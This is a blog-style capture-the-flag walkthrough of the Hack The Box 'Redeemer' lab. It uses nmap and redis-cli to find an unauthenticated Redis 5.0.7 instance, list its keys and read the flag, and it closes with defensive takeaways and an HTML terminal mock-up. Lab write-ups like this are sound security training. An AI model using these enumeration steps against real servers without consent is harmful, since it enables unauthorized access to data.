---
title: "HTB: Redeemer — Full Walkthrough"
date: 2026-04-12 00:00:00 +0000
categories: [Red Team, HTB]
tags: [nmap, redis, enumeration, hackthebox]
---

## TL;DR
Redeemer is a Starting Point machine focused on Redis enumeration. 
No credentials needed — just connect and grab the flag.

## Reconnaissance
Start with a full port scan:

```bash
nmap -sV -p- --min-rate 5000 10.129.x.x
```

Results show port **6379** open running **Redis 5.0.7**.

## Enumeration
Connect to Redis directly using `redis-cli`:

```bash
redis-cli -h 10.129.x.x
```

Check server info:

```bash
info server
```

List all keys:

```bash
keys *
```

## Flag
Dump the flag key:

```bash
get flag
```

## Takeaways
- Redis should never be exposed without authentication
- Always scan all ports — default Nmap misses 6379
- `redis-cli` is your best friend for unauthenticated instances

<div class="terminal">
  <div class="terminal-bar">
    <span class="t-red"></span>
    <span class="t-amber"></span>
    <span class="t-green"></span>
    <span class="t-title">アンドリュー㉿day1</span>
  </div>
  <div class="terminal-body">
    <p>
      <span class="prompt">┌──(アンドリュー㉿day1)-[</span>
      <span class="prompt-path">~/htb/redeemer</span>
      <span class="prompt">]</span>
    </p>
    <p>
      <span class="prompt">└─$ </span>
      <span class="cmd">nmap -sV -p- --min-rate 5000 10.129.1.1</span>
    </p>
    <p><span class="out">Starting Nmap 7.94...</span></p>
    <p><span class="out">PORT     STATE SERVICE VERSION</span></p>
    <p><span class="success">6379/tcp open  redis   Redis 5.0.7</span></p>
  </div>
</div>
